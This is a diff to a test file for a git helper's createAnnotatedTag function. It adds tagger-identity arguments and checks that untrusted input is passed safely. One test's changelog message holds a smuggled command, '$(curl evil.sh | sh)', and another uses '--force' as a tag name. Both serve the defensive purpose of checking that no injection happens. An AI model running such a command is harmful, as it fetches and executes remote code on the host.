@@ -396,10 +396,20 @@ describe('tagExists', () => {
 })
 
 describe('createAnnotatedTag', () => {
-  it('creates an annotated tag with argv [tag, -a, -m, message, --, name, sha]', () => {
-    git.createAnnotatedTag('v1.2.3', 'Release v1.2.3', 'abc123')
+  it('creates an annotated tag with per-command tagger identity', () => {
+    git.createAnnotatedTag(
+      'v1.2.3',
+      'Release v1.2.3',
+      'abc123',
+      'release-bot',
+      'bot@example.com'
+    )
 
     expect(mockExec).toHaveBeenCalledWith('git', [
+      '-c',
+      'user.name=release-bot',
+      '-c',
+      'user.email=bot@example.com',
       'tag',
       '-a',
       '-m',
@@ -410,6 +420,24 @@ describe('createAnnotatedTag', () => {
     ])
   })
 
+  // Regression coverage: an annotated tag embeds its own "tagger" field
+  // (like a commit's author/committer), so without an explicit identity it
+  // fails on a runner with no git user.name/email configured -- "fatal:
+  // empty ident name ... Committer identity unknown" -- exactly like a
+  // commit would without commitFilesToBranch's -c user.name/-c user.email.
+  it('always includes -c user.name/-c user.email before the tag subcommand', () => {
+    git.createAnnotatedTag('v1.2.3', 'msg', 'abc123', 'a', 'b@example.com')
+
+    const args = mockExec.mock.calls[0][1]
+    expect(args.slice(0, 4)).toEqual([
+      '-c',
+      'user.name=a',
+      '-c',
+      'user.email=b@example.com'
+    ])
+    expect(args[4]).toBe('tag')
+  })
+
   it('passes a hostile multiline changelog message as a single argv element', () => {
     const message =
       '## v1.2.3\n\n' +
@@ -417,17 +445,25 @@ describe('createAnnotatedTag', () => {
       '- fix: handle $(curl evil.sh | sh) in titles\n' +
       '- chore: quotes \'single\' and "double"; semicolons; && ||\n'
 
-    git.createAnnotatedTag('v1.2.3', message, 'abc123')
+    git.createAnnotatedTag('v1.2.3', message, 'abc123', 'a', 'b@example.com')
 
     expect(mockExec).toHaveBeenCalledTimes(1)
     const args = mockExec.mock.calls[0][1]
-    expect(args).toEqual(['tag', '-a', '-m', message, '--', 'v1.2.3', 'abc123'])
+    expect(args.slice(4)).toEqual([
+      'tag',
+      '-a',
+      '-m',
+      message,
+      '--',
+      'v1.2.3',
+      'abc123'
+    ])
     // The whole hostile message is exactly one argv element, unaltered.
-    expect(args[3]).toBe(message)
+    expect(args[7]).toBe(message)
   })
 
   it('places untrusted tag names after the -- separator', () => {
-    git.createAnnotatedTag('--force', 'msg', 'abc123')
+    git.createAnnotatedTag('--force', 'msg', 'abc123', 'a', 'b@example.com')
 
     const args = mockExec.mock.calls[0][1]
     expect(args.indexOf('--')).toBeLessThan(args.indexOf('--force'))
@@ -436,9 +472,20 @@ describe('createAnnotatedTag', () => {
   // overwrite-existing-tags support: force-moving a pre-existing tag is the
   // git equivalent of the old Octokit createRef({ force: true }) upsert.
   it('adds -f before -a when force is true, to move a pre-existing tag', () => {
-    git.createAnnotatedTag('v1.2.3', 'Release v1.2.3', 'abc123', true)
+    git.createAnnotatedTag(
+      'v1.2.3',
+      'Release v1.2.3',
+      'abc123',
+      'a',
+      'b@example.com',
+      true
+    )
 
     expect(mockExec).toHaveBeenCalledWith('git', [
+      '-c',
+      'user.name=a',
+      '-c',
+      'user.email=b@example.com',
       'tag',
       '-f',
       '-a',
@@ -451,7 +498,14 @@ describe('createAnnotatedTag', () => {
   })
 
   it('omits -f when force is false (default)', () => {
-    git.createAnnotatedTag('v1.2.3', 'Release v1.2.3', 'abc123', false)
+    git.createAnnotatedTag(
+      'v1.2.3',
+      'Release v1.2.3',
+      'abc123',
+      'a',
+      'b@example.com',
+      false
+    )
 
     const args = mockExec.mock.calls[0][1]
     expect(args).not.toContain('-f')
